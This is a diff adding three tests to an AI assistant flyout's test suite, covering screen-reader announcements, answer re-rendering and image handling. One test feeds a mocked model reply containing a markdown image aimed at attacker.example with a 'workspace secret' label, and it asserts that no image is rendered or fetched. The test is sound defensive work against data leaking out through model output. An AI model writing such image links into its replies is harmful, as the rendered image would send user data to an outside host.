@@ -986,6 +986,66 @@ describe("AssistantFlyout", () => {
     expect(log).toContainElement(answer);
   });
 
+  // The transcript is a live region, and a reveal rewrites the answer's text
+  // on every frame. Frozen mid-reveal here (no animation frame ever runs), the
+  // growing copy has to be out of the accessibility tree and the whole reply
+  // present once, in the copy the region announces.
+  it("announces the whole reply once rather than every frame of its reveal", async () => {
+    const frames = vi
+      .spyOn(window, "requestAnimationFrame")
+      .mockImplementation(() => 1);
+    try {
+      const { user } = await openFlyout();
+      await ask(user, "what is live?");
+      const answer = await screen.findByTestId("assistant-answer");
+
+      expect(answer.querySelector("[inert]")).toHaveAttribute(
+        "aria-hidden",
+        "true",
+      );
+      expect(
+        screen.getByTestId("assistant-answer-announced"),
+      ).toHaveTextContent("Three runs are live.");
+    } finally {
+      frames.mockRestore();
+    }
+  });
+
+  // A reply is model output, and an image in it would be fetched the moment it
+  // rendered, carrying whatever the model put in its URL to that host.
+  it("renders an image in a reply as its alt text and never fetches it (negative)", async () => {
+    askAssistant.mockResolvedValue(
+      turn({
+        reply: "See ![workspace secret](https://attacker.example/x?d=1)",
+      }),
+    );
+    const { user, flyout } = await openFlyout();
+    await ask(user, "what is live?");
+    await findAnswerText("workspace secret");
+
+    expect(flyout.querySelector("img")).toBeNull();
+  });
+
+  // Only the thread on screen is mounted, so coming back to a workspace
+  // remounts every answer in it. One that already finished its reveal paints
+  // whole on the way back instead of typing itself out again.
+  it("paints an answer already revealed whole when the person comes back to its workspace", async () => {
+    const { user, renavigate } = await openFlyout();
+    await ask(user, "what is live?");
+    await findAnswerText("Three runs are live.");
+    await waitFor(() => {
+      expect(screen.queryByTestId("assistant-answer-announced")).toBeNull();
+    });
+
+    renavigate("/acme/payments");
+    renavigate("/acme/core-platform");
+
+    expect(screen.getByTestId("assistant-answer")).toHaveTextContent(
+      "Three runs are live.",
+    );
+    expect(screen.queryByTestId("assistant-answer-announced")).toBeNull();
+  });
+
   it("has no axe violations", async () => {
     const { flyout } = await openFlyout();
     await expectNoAxe(flyout);
